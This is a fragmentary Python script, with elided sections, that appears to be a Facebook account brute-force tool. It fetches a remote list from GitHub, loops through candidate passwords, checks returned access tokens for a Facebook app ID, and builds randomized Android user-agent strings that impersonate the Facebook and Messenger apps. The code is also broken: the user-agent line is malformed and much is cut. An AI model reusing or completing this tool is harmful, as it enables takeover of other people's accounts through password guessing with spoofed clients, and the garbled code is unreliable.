...
xx=requests.get('https://github.com/RIFAT-100-hub/King/blob/main/Afroveal3.txt').text.splitlines()
def clear():
	os.system('clear')
	print(logo)
logo=("""\033[1;37m
	...
	try:
		...
		for pw in passlist:
			...
			if '350685531728' in accessToken:
				...
				fban = 'Orca-Android'
				fbpn = 'com.facebook.orca'
			ua = 'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))[FBAN/FB4A;FBAV/68.0.0.3927;FBBV/3952373;[FBAN/FB4A;FBAV/1.8.4;FBDM/ ity=0.75,width=320,height=240};FBLC/es_AR;FB_FW/1;FBCR/CLARO;FBPN/com.facebook.katana;FB FBSV/2.1-update1;]
